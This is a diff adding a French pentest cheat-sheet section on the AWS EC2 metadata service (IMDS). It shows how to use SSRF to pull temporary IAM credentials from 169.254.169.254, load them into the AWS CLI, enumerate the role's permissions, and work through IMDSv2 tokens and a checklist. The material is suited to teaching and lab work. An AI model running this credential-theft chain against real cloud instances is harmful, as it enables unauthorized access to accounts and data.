@@ -1,6 +1,6 @@
 # AWS
 
-## <mark style="color:$danger;">Exploitation AWS S3 et MinIO</mark>
+## <mark style="color:red;">Exploitation AWS S3 et MinIO</mark>
 
 ### <mark style="color:blue;">Introduction</mark>
 
@@ -804,3 +804,246 @@ pip install bucket-stream
 # Monitoring en temps réel
 bucket-stream --only-interesting
 ```
+
+***
+
+## <mark style="color:red;">AWS IMDS</mark>&#x20;
+
+### <mark style="color:blue;">C'est quoi l'IMDS ?</mark>
+
+L'IMDS (Instance Metadata Service) est un serveur HTTP interne disponible sur **toutes** les instances EC2 AWS à l'adresse `169.254.169.254`. Il donne des informations sur l'instance et surtout des **credentials IAM temporaires** si un rôle est attaché à l'instance.
+
+Il n'est accessible que depuis l'intérieur de l'instance — mais une SSRF suffit pour y accéder depuis l'extérieur.
+
+```
+Attaquant  →  SSRF  →  Serveur EC2  →  169.254.169.254  →  credentials IAM
+```
+
+> **IMDSv1 vs IMDSv2**
+>
+> * IMDSv1 : accès direct, aucun token requis. Le plus courant dans les vieux environnements.
+> * IMDSv2 : nécessite d'abord un token via PUT. Plus sécurisé mais contournable si la SSRF supporte les headers. Cette fiche couvre IMDSv1. Pour IMDSv2, voir la section dédiée en bas.
+
+***
+
+### <mark style="color:blue;">Chemins importants à connaître</mark>
+
+#### Racine — lister ce qui est disponible
+
+```
+/latest/meta-data/
+```
+
+Retourne la liste des clés disponibles. Toujours commencer par là.
+
+***
+
+#### Informations sur l'instance
+
+| Donnée              | Chemin                                                   |
+| ------------------- | -------------------------------------------------------- |
+| ID de l'instance    | `/latest/meta-data/instance-id`                          |
+| Type d'instance     | `/latest/meta-data/instance-type`                        |
+| IP locale           | `/latest/meta-data/local-ipv4`                           |
+| Hostname interne    | `/latest/meta-data/local-hostname`                       |
+| IP publique         | `/latest/meta-data/public-ipv4`                          |
+| Hostname public     | `/latest/meta-data/public-hostname`                      |
+| AMI utilisée        | `/latest/meta-data/ami-id`                               |
+| Groupes de sécurité | `/latest/meta-data/security-groups`                      |
+| Zone de dispo       | `/latest/meta-data/placement/availability-zone`          |
+| Région              | `/latest/meta-data/placement/region`                     |
+| ID du compte AWS    | `/latest/meta-data/identity-credentials/ec2/info`        |
+| MAC address         | `/latest/meta-data/mac`                                  |
+| VPC et subnet       | `/latest/meta-data/network/interfaces/macs/<MAC>/vpc-id` |
+
+***
+
+#### <mark style="color:green;">IAM — la partie critique</mark>
+
+```
+# Étape 1 : savoir si un rôle IAM est attaché
+/latest/meta-data/iam/info
+
+# Étape 2 : récupérer le nom du rôle
+/latest/meta-data/iam/security-credentials/
+
+# Étape 3 : récupérer les credentials du rôle
+/latest/meta-data/iam/security-credentials/<NOM_DU_ROLE>
+```
+
+Résultat de l'étape 3 :
+
+```json
+{
+  "Code": "Success",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
+  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
+  "Token": "IQoJb3Jp...",
+  "Expiration": "2026-06-25T20:14:53Z"
+}
+```
+
+***
+
+#### <mark style="color:green;">User-data — souvent oublié, souvent juteux</mark>
+
+```
+/latest/user-data
+```
+
+Contient le script exécuté au démarrage de l'instance. Peut contenir des **mots de passe, clés SSH, tokens** en clair si le DevOps a mal configuré.
+
+***
+
+#### <mark style="color:green;">Autres chemins utiles</mark>
+
+```
+# Clés SSH autorisées (parfois exploitable)
+/latest/meta-data/public-keys/0/openssh-key
+
+# Token IMDSv2 pour les requêtes suivantes
+/latest/api/token   (via PUT avec header TTL)
+
+# Données réseau complètes
+/latest/meta-data/network/interfaces/macs/
+
+# Identité de l'instance (signé AWS, utile pour vérifier)
+/latest/dynamic/instance-identity/document
+```
+
+***
+
+### <mark style="color:blue;">Comprendre les credentials récupérés</mark>
+
+| Champ             | Préfixe   | Signification                                      |
+| ----------------- | --------- | -------------------------------------------------- |
+| `AccessKeyId`     | `ASIA...` | Credential **temporaire** (STS) — expire           |
+| `AccessKeyId`     | `AKIA...` | Credential **permanent** (IAM User) — n'expire pas |
+| `SecretAccessKey` | —         | Clé secrète associée                               |
+| `Token`           | —         | **Obligatoire** avec ASIA, absent avec AKIA        |
+| `Expiration`      | —         | Date d'expiration (généralement 6h)                |
+
+> Les credentials `ASIA` sont temporaires et générés par AWS STS. Il faut **toujours** inclure le `Token` dans les requêtes, sinon AWS retourne une erreur `InvalidClientTokenId`.
+
+***
+
+### <mark style="color:blue;">Utiliser les credentials récupérés</mark>
+
+#### <mark style="color:green;">Avec AWS CLI</mark>
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
+export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
+export AWS_SESSION_TOKEN="IQoJb3Jp..."
+export AWS_DEFAULT_REGION="us-east-1"
+
+# Vérifier l'identité du rôle
+aws sts get-caller-identity
+```
+
+Retourne :
+
+```json
+{
+  "UserId": "AROAQX4PG7L2EXAMPLE:i-0a1b2c3d4e5f6789a",
+  "Account": "847219365028",
+  "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
+}
+```
+
+***
+
+### <mark style="color:blue;">Énumérer les permissions du rôle</mark>
+
+Tester service par service ce que le rôle peut faire :
+
+```bash
+# SQS
+aws sqs list-queues
+
+# S3
+aws s3 ls
+
+# EC2
+aws ec2 describe-instances
+
+# Lambda
+aws lambda list-functions
+
+# Secrets Manager
+aws secretsmanager list-secrets
+
+# SSM Parameter Store
+aws ssm describe-parameters
+
+# IAM (rare mais précieux)
+aws iam list-roles
+aws iam get-role --role-name <role>
+
+# CodeBuild
+aws codebuild list-projects
+
+# ECS / EKS
+aws ecs list-clusters
+aws eks list-clusters
+```
+
+> `AccessDenied` = le rôle n'a pas la permission. Continuer à tester les autres services.
+
+***
+
+### <mark style="color:blue;">Accès à un endpoint LocalStack / émulateur</mark>
+
+Si le serveur utilise un émulateur AWS interne (LocalStack, floci, moto…) accessible depuis le réseau interne :
+
+```bash
+# Avec credentials volés via SSRF
+aws --endpoint-url http://aws.example.htb sts get-caller-identity
+
+# Depuis l'intérieur du réseau (test/test souvent accepté sans auth)
+aws --endpoint-url http://localstack:4566 \
+    --no-sign-request \
+    sts get-caller-identity
+
+# Avec credentials factices (LocalStack accepte tout par défaut)
+AWS_ACCESS_KEY_ID=test \
+AWS_SECRET_ACCESS_KEY=test \
+aws --endpoint-url http://localstack:4566 sts get-caller-identity
+```
+
+***
+
+### <mark style="color:blue;">IMDSv2 — si IMDSv1 est désactivé</mark>
+
+IMDSv2 nécessite d'abord de récupérer un token via une requête PUT :
+
+```bash
+# Étape 1 : récupérer le token (TTL en secondes)
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Étape 2 : utiliser le token dans les requêtes suivantes
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+Pour une SSRF, il faut que la SSRF supporte les requêtes PUT et l'injection de headers — moins courant mais pas impossible.
+
+***
+
+### <mark style="color:blue;">Checklist rapide en pentest</mark>
+
+```
+[ ] Accéder à /latest/meta-data/                         → lister les clés dispo
+[ ] Accéder à /latest/meta-data/iam/info                 → vérifier si rôle attaché
+[ ] Accéder à /latest/meta-data/iam/security-credentials/→ nom du rôle
+[ ] Récupérer les credentials du rôle                    → AccessKeyId + Token
+[ ] aws sts get-caller-identity                          → confirmer identité
+[ ] Tester S3, SQS, Lambda, SSM, Secrets Manager        → trouver les permissions
+[ ] Lire /latest/user-data                               → chercher secrets en clair
+[ ] Lire /latest/meta-data/public-keys/                  → clés SSH exposées
+[ ] Vérifier l'expiration des credentials                → agir avant Expiration
+```
+
+***
